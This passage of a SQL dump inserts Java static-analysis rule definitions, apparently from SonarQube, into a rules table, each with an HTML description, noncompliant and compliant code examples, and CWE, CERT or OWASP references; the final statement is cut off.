INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (942, 'Objects should not be created only to "getClass"', 'S2133', NULL, 'squid', '<p>Creating an object for the sole purpose of calling <code>getClass</code> on it is a waste of memory and cycles. Instead, simply use the class''
<code>.class</code> property.</p>
<h2>Noncompliant Code Example</h2>
<pre>
MyObject myOb = new MyObject();  // Noncompliant
Class c = myOb.getClass();
</pre>
<h2>Compliant Solution</h2>
<pre>
Class c = MyObject.class;
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'performance', false, 'HTML', 1510817812985, 1510817812985, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (943, 'Only standard cryptographic algorithms should be used', 'S2257', NULL, 'squid', '<p>The use of a non-standard algorithm is dangerous because a determined attacker may be able to break the algorithm and compromise whatever data has
been protected. Standard algorithms like <code>SHA-256</code>, <code>SHA-384</code>, <code>SHA-512</code>, ... should be used instead.</p>
<p>This rule tracks creation of <code>java.security.MessageDigest</code> subclasses.</p>
<h2>Noncompliant Code Example</h2>
<pre>
MyCryptographicAlgorithm extends MessageDigest {
  ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/327.html">CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10_2013-A6-Sensitive_Data_Exposure">OWASP Top Ten 2013 Category A6</a> - Sensitive Data Exposure
  </li>
  <li> <a href="http://www.sans.org/top25-software-errors/">SANS Top 25</a> - Porous Defenses </li>
  <li> Derived from FindSecBugs rule <a href="http://h3xstream.github.io/find-sec-bugs/bugs.htm#CUSTOM_MESSAGE_DIGEST">MessageDigest is Custom</a>
  </li>
</ul>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1d', NULL, NULL, 'cwe,owasp-a6,sans-top25-porous', false, 'HTML', 1510817812985, 1510817812986, 3);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (944, 'Expressions used in "assert" should not produce side effects', 'S3346', NULL, 'squid', '<p>Since <code>assert</code> statements aren''t executed by default (they must be enabled with JVM flags) developers should never rely on their
execution the evaluation of any logic required for correct program function.</p>
<h2>Noncompliant Code Example</h2>
<pre>
assert myList.remove(myList.get(0));  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
boolean removed = myList.remove(myList.get(0));
assert removed;
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/vwG7AQ">CERT, EXP06-J.</a> - Expressions used in assertions must not produce side
  effects </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cert', false, 'HTML', 1510817812986, 1510817812987, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (947, '"javax.crypto.NullCipher" should not be used for anything other than testing', 'S2258', NULL, 'squid', '<p>By contract, the <code>NullCipher</code> class provides an "identity cipher" <del></del> one that does not transform or encrypt the plaintext in
any way. As a consequence, the ciphertext is identical to the plaintext. So this class should be used for testing, and never in production code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
NullCipher nc=new NullCipher();
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/327.html">CWE-327</a>: Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10_2013-A6-Sensitive_Data_Exposure">OWASP Top Ten 2013 Category A6</a> - Sensitive Data Exposure
  </li>
  <li> Derived from FindSecBugs rule <a href="http://h3xstream.github.io/find-sec-bugs/bugs.htm#NULL_CIPHER">NullCipher Unsafe</a> </li>
</ul>', 4, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'cwe,owasp-a6,sans-top25-porous', false, 'HTML', 1510817812990, 1510817812990, 3);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (945, 'Empty arrays and collections should be returned instead of null', 'S1168', NULL, 'squid', '<p>Returning <code>null</code> instead of an actual array or collection forces callers of the method to explicitly test for nullity, making them more
complex and less readable.</p>
<p>Moreover, in many cases, <code>null</code> is used as a synonym for empty.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public static List&lt;Result&gt; getResults() {
  return null;                             // Noncompliant
}

public static Result[] getResults() {
  return null;                             // Noncompliant
}

public static void main(String[] args) {
  Result[] results = getResults();

  if (results != null) {                   // Nullity test required to prevent NPE
    for (Result result: results) {
      /* ... */
    }
  }
}

</pre>
<h2>Compliant Solution</h2>
<pre>
public static List&lt;Result&gt; getResults() {
  return Collections.emptyList();          // Compliant
}

public static Result[] getResults() {
  return new Result[0];
}

public static void main(String[] args) {
  for (Result result: getResults()) {
    /* ... */
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/AgG7AQ">CERT, MSC19-C.</a> - For functions that return an array, prefer returning an
  empty array over a null value </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/zwHEAw">CERT, MET55-J.</a> - Return an empty array or collection instead of a null
  value for methods that return an array or collection </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, 'cert', false, 'HTML', 1510817812988, 1510817812988, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (946, 'Null pointers should not be dereferenced', 'S2259', NULL, 'squid', '<p>A reference to <code>null</code> should never be dereferenced/accessed. Doing so will cause a <code>NullPointerException</code> to be thrown. At
best, such an exception will cause abrupt program termination. At worst, it could expose debugging information that would be useful to an attacker, or
it could allow an attacker to bypass security measures.</p>
<p>Note that when they are present, this rule takes advantage of <code>@CheckForNull</code> and <code>@Nonnull</code> annotations defined in <a
href="https://jcp.org/en/jsr/detail?id=305">JSR-305</a> to understand which values are and are not nullable except when <code>@Nonnull</code> is used
on the parameter to <code>equals</code>, which by contract should always work with null.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@CheckForNull
String getName(){...}

public boolean isNameEmpty() {
  return getName().length() == 0; // Noncompliant; the result of getName() could be null, but isn''t null-checked
}
</pre>
<pre>
Connection conn = null;
Statement stmt = null;
try{
  conn = DriverManager.getConnection(DB_URL,USER,PASS);
  stmt = conn.createStatement();
  // ...

}catch(Exception e){
  e.printStackTrace();
}finally{
  stmt.close();   // Noncompliant; stmt could be null if an exception was thrown in the try{} block
  conn.close();  // Noncompliant; conn could be null if an exception was thrown
}
</pre>
<pre>
private void merge(@Nonnull Color firstColor, @Nonnull Color secondColor){...}

public  void append(@CheckForNull Color color) {
    merge(currentColor, color);  // Noncompliant; color should be null-checked because merge(...) doesn''t accept nullable parameters
}
</pre>
<pre>
void paint(Color color) {
  if(color == null) {
    System.out.println("Unable to apply color " + color.toString());  // Noncompliant; NullPointerException will be thrown
    return;
  }
  ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/476.html">MITRE, CWE-476</a> - NULL Pointer Dereference </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/PAw">CERT, EXP34-C.</a> - Do not dereference null pointers </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/ZwDOAQ">CERT, EXP01-J.</a> - Do not use a null in a case where an object is required
  </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'cert,cwe', false, 'HTML', 1510817812989, 1510817812989, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (952, '"switch case" clauses should not have too many lines of code', 'S1151', NULL, 'squid', '<p>The <code>switch</code> statement should be used only to clearly define some new branches in the control flow. As soon as a <code>case</code>
clause contains too many statements this highly decreases the readability of the overall control flow statement. In such case, the content of the
<code>case</code> clause should be extracted into a dedicated method.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 5:</p>
<pre>
switch (myVariable) {
  case 0: // 6 lines till next case
    methodCall1("");
    methodCall2("");
    methodCall3("");
    methodCall4("");
    break;
  case 1:
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch (myVariable) {
  case 0:
    doSomething()
    break;
  case 1:
  ...
}
...
private void doSomething(){
    methodCall1("");
    methodCall2("");
    methodCall3("");
    methodCall4("");
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'brain-overload', false, 'HTML', 1510817812996, 1510817812996, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (953, 'Constructors should not be used to instantiate "String" and primitive-wrapper classes', 'S2129', NULL, 'squid', '<p>Constructors for <code>Strings</code> and the objects used to wrap primitives should never be used. Doing so is less clear and uses more memory
than simply using the desired value in the case of strings, and using <code>valueOf</code> for everything else.</p>
<p>Further, these constructors are deprecated in Java 9, which is an indication that they will eventually be removed from the language altogether.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String empty = new String(); // Noncompliant; yields essentially "", so just use that.
String nonempty = new String("Hello world"); // Noncompliant
Double myDouble = new Double(1.1); // Noncompliant; use valueOf
Integer integer = new Integer(1); // Noncompliant
Boolean bool = new Boolean(true); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
String empty = "";
String nonempty = "Hello world";
Double myDouble = Double.valueOf(1.1);
Integer integer = Integer.valueOf(1);
Boolean bool = Boolean.valueOf(true);
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'performance', false, 'HTML', 1510817812999, 1510817812999, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (954, 'String.valueOf() should not be appended to a String', 'S1153', NULL, 'squid', '<p>Appending <code>String.valueOf()</code> to a <code>String</code> decreases the code readability.</p>
<p>The argument passed to <code>String.valueOf()</code> should be directly appended instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void display(int i){
  System.out.println("Output is " + String.valueOf(i));    // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void display(int i){
  System.out.println("Output is " + i);                    // Compliant
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'clumsy', false, 'HTML', 1510817813000, 1510817813000, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (955, 'Values should not be uselessly incremented', 'S2123', NULL, 'squid', '<p>A value that is incremented or decremented and then not stored is at best wasted code and at worst a bug.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public int pickNumber() {
  int i = 0;
  int j = 0;

  i = i++; // Noncompliant; i is still zero

  return j++; // Noncompliant; 0 returned
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public int pickNumber() {
  int i = 0;
  int j = 0;

  i++;
  return ++j;
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'unused', false, 'HTML', 1510817813001, 1510817813001, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (956, 'Labels should not be used', 'LabelsShouldNotBeUsedCheck', 'S1119', 'squid', '<p>Labels are not commonly used in Java, and many developers do not understand how they work. Moreover, their usage makes the control flow harder to
follow, which reduces the code''s readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int matrix[][] = {
  {1, 2, 3},
  {4, 5, 6},
  {7, 8, 9}
};

outer: for (int row = 0; row &lt; matrix.length; row++) {   // Non-Compliant
  for (int col = 0; col &lt; matrix[row].length; col++) {
    if (col == row) {
      continue outer;
    }
    System.out.println(matrix[row][col]);                // Prints the elements under the diagonal, i.e. 4, 7 and 8
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
for (int row = 1; row &lt; matrix.length; row++) {          // Compliant
  for (int col = 0; col &lt; row; col++) {
    System.out.println(matrix[row][col]);                // Also prints 4, 7 and 8
  }
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, 'confusing', false, 'HTML', 1510817813002, 1510817813002, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (958, '"ScheduledThreadPoolExecutor" should not have 0 core threads', 'S2122', NULL, 'squid', '<p><code>java.util.concurrent.ScheduledThreadPoolExecutor</code>''s pool is sized with <code>corePoolSize</code>, so setting <code>corePoolSize</code>
to zero means the executor will have no threads and run nothing.</p>
<p>This rule detects instances where <code>corePoolSize</code> is set to zero, via either its setter or the object constructor.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void do(){

  ScheduledThreadPoolExecutor stpe1 = new ScheduledThreadPoolExecutor(0); // Noncompliant

  ScheduledThreadPoolExecutor stpe2 = new ScheduledThreadPoolExecutor(POOL_SIZE);
  stpe2.setCorePoolSize(0);  // Noncompliant
</pre>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, NULL, false, 'HTML', 1510817813004, 1510817813004, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (959, 'Test classes should comply with a naming convention', 'S3577', NULL, 'squid', '<p>Shared naming conventions allow teams to collaborate efficiently. This rule raises an issue when a test class name does not match the provided
regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default value: <code>^((Test|IT)[a-zA-Z0-9]+|[A-Z][a-zA-Z0-9]*(Test|IT|TestCase|ITCase))$</code></p>
<pre>
class Foo {  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class FooTest {
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'convention,tests', false, 'HTML', 1510817813005, 1510817813005, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (960, 'Case insensitive string comparisons should be made without intermediate upper or lower casing', 'S1157', NULL, 'squid', '<p>Using <code>toLowerCase()</code> or <code>toUpperCase()</code> to make case insensitive comparisons is inefficient because it requires the creation
of temporary, intermediate <code>String</code> objects.</p>
<h2>Noncompliant Code Example</h2>
<pre>
boolean result1 = foo.toUpperCase().equals(bar);             // Noncompliant
boolean result2 = foo.equals(bar.toUpperCase());             // Noncompliant
boolean result3 = foo.toLowerCase().equals(bar.LowerCase()); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
boolean result = foo.equalsIgnoreCase(bar);                  // Compliant
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'clumsy', false, 'HTML', 1510817813006, 1510817813006, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (961, 'Pseudorandom number generators (PRNGs) should not be used in secure contexts', 'S2245', NULL, 'squid', '<p>When software generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that
will be generated, and use this guess to impersonate another user or access sensitive information.</p>
<p>As the <code>java.util.Random</code> class relies on a pseudorandom number generator, this class and relating <code>java.lang.Math.random()</code>
method should not be used for security-critical applications or for protecting sensitive data. In such context, the
<code>java.security.SecureRandom</code> class which relies on a cryptographically strong random number generator (RNG) should be used in place.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Random random = new Random();
byte bytes[] = new byte[20];
random.nextBytes(bytes);
</pre>
<h2>Compliant Solution</h2>
<pre>
SecureRandom random = new SecureRandom();
byte bytes[] = new byte[20];
random.nextBytes(bytes);
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/338.html">MITRE, CWE-338</a> - Use of Cryptographically Weak Pseudo-Random Number Generator
  (PRNG) </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/330.html">MITRE, CWE-330</a> - Use of Insufficiently Random Values </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/326.html">MITRE, CWE-326</a> - Inadequate Encryption Strength </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/310">MITRE, CWE-310</a> - Cryptographic Issues </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/mAFqAQ">CERT, MSC02-J.</a> - Generate strong random numbers </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/qw4">CERT, MSC30-C.</a> - Do not use the rand() function for generating pseudorandom
  numbers </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/WYIyAQ">CERT, MSC50-CPP.</a> - Do not use std::rand() for generating pseudorandom
  numbers </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10_2013-A6-Sensitive_Data_Exposure">OWASP Top Ten 2013 Category A6</a> - Sensitive Data Exposure
  </li>
  <li> Derived from FindSecBugs rule <a href="http://h3xstream.github.io/find-sec-bugs/bugs.htm#PREDICTABLE_RANDOM">Predictable Pseudo Random Number
  Generator</a> </li>
</ul>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'cert,cwe,owasp-a6', false, 'HTML', 1510817813007, 1510817813008, 3);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (962, 'Primitive wrappers should not be instantiated only for "toString" or "compareTo" calls', 'S1158', NULL, 'squid', '<p>Creating temporary primitive wrapper objects only for <code>String</code> conversion or the use of the <code>compareTo</code> method is
inefficient.</p>
<p>Instead, the static <code>toString()</code> or <code>compare</code> method of the primitive wrapper class should be used.</p>
<h2>Noncompliant Code Example</h2>
<pre>
new Integer(myInteger).toString();  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
Integer.toString(myInteger);        // Compliant
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'clumsy', false, 'HTML', 1510817813009, 1510817813009, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (964, 'Printf-style format strings should be used correctly', 'S3457', NULL, 'squid', '<p>Because <code>printf</code>-style format strings are interpreted at runtime, rather than validated by the compiler, they can contain errors that
result in the wrong strings being created. This rule statically validates the correlation of <code>printf</code>-style format strings to their
arguments when calling the <code>format(...)</code> methods of <code>java.util.Formatter</code>, <code>java.lang.String</code>,
<code>java.io.PrintStream</code>, <code>MessageFormat</code>, and <code>java.io.PrintWriter</code> classes and the <code>printf(...)</code> methods of
<code>java.io.PrintStream</code> or <code>java.io.PrintWriter</code> classes. </p>
<h2>Noncompliant Code Example</h2>
<pre>
String.format("First {0} and then {1}", "foo", "bar");  //Noncompliant. Looks like there is a confusion with the use of {{java.text.MessageFormat}}, parameters "foo" and "bar" will be simply ignored here
String.format("Display %3$d and then %d", 1, 2, 3);   //Noncompliant; the second argument ''2'' is unused
String.format("Too many arguments %d and %d", 1, 2, 3);  //Noncompliant; the third argument ''3'' is unused
String.format("First Line\n");   //Noncompliant; %n should be used in place of \n to produce the platform-specific line separator
String.format("Is myObject null ? %b", myObject);   //Noncompliant; when a non-boolean argument is formatted with %b, it prints true for any nonnull value, and false for null. Even if intended, this is misleading. It''s better to directly inject the boolean value (myObject == null in this case)
String.format("value is " + value); // Noncompliant
String s = String.format("string without arguments"); // Noncompliant

MessageFormat.format("Result ''{0}''.", value); // Noncompliant; String contains no format specifiers. (quote are discarding format specifiers)
MessageFormat.format("Result {0}.", value, value);  // Noncompliant; 2nd argument is not used
MessageFormat.format("Result {0}.", myObject.toString()); // Noncompliant; no need to call toString() on objects
</pre>
<h2>Compliant Solution</h2>
<pre>
String.format("First %s and then %s", "foo", "bar");
String.format("Display %2$d and then %d", 1, 3);
String.format("Too many arguments %d %d", 1, 2);
String.format("First Line%n");
String.format("Is myObject null ? %b", myObject == null);
String.format("value is %d", value);
String s = "string without arguments";

MessageFormat.format("Result {0}.", value);
MessageFormat.format("Result ''{0}''  =  {0}", value);
MessageFormat.format("Result {0}.", myObject);
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/wQA1">CERT, FIO47-C.</a> - Use valid format strings </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/e4EyAQ">CERT, FIO00-CPP.</a> - Take care when creating format strings </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'cert,confusing', false, 'HTML', 1510817813011, 1510817813011, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (965, 'Test methods should comply with a naming convention', 'S3578', NULL, 'squid', '<p>Shared naming conventions allow teams to collaborate efficiently. This rule raises an issue when a test method name does not match the provided
regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default value: <code>^test[A-Z][a-zA-Z0-9]*$</code></p>
<pre>
@Test
public void foo() {  // Noncompliant
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@Test
public void testFoo() {
  // ...
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'convention,tests', false, 'HTML', 1510817813012, 1510817813012, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (966, 'Classes should not access their own subclasses during initialization', 'S2390', NULL, 'squid', '<p>When a parent class references a member of a subclass during its own initialization, the results might not be what you expect because the child
class might not have been initialized yet. This could create what is known as an "initialisation cycle", or even a deadlock in some extreme cases.</p>
<p>To make things worse, these issues are very hard to diagnose so it is highly recommended you avoid creating this kind of dependencies.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Parent {
  static int field1 = Child.method(); // Noncompliant
  static int field2 = 42;

  public static void main(String[] args) {
    System.out.println(Parent.field1); // will display "0" instead of "42"
  }
}

class Child extends Parent {
  static int method() {
    return Parent.field2;
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/display/java/DCL00-J.+Prevent+class+initialization+cycles">CERT, DCL00-J.</a> - Prevent
  class initialization cycles </li>
  <li> Java Language Specifications - <a href="http://docs.oracle.com/javase/specs/jls/se8/html/jls-12.html#jls-12.4">Section 12.4: Initialization of
  Classes and Interfaces</a> </li>
</ul>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'cert', false, 'HTML', 1510817813014, 1510817813014, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (973, 'Static non-final field names should comply with a naming convention', 'S3008', NULL, 'squid', '<p>Shared naming conventions allow teams to collaborate efficiently. This rule checks that static non-final field names match a provided regular
expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^[a-z][a-zA-Z0-9]*$</code>:</p>
<pre>
public final class MyClass {
   private static String foo_bar;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass {
   private static String fooBar;
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'convention', false, 'HTML', 1510817813021, 1510817813021, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (967, 'Throwable and Error should not be caught', 'S1181', NULL, 'squid', '<p><code>Throwable</code> is the superclass of all errors and exceptions in Java. <code>Error</code> is the superclass of all errors, which are not
meant to be caught by applications.</p>
<p>Catching either <code>Throwable</code> or <code>Error</code> will also catch <code>OutOfMemoryError</code> and <code>InternalError</code>, from
which an application should not attempt to recover.</p>
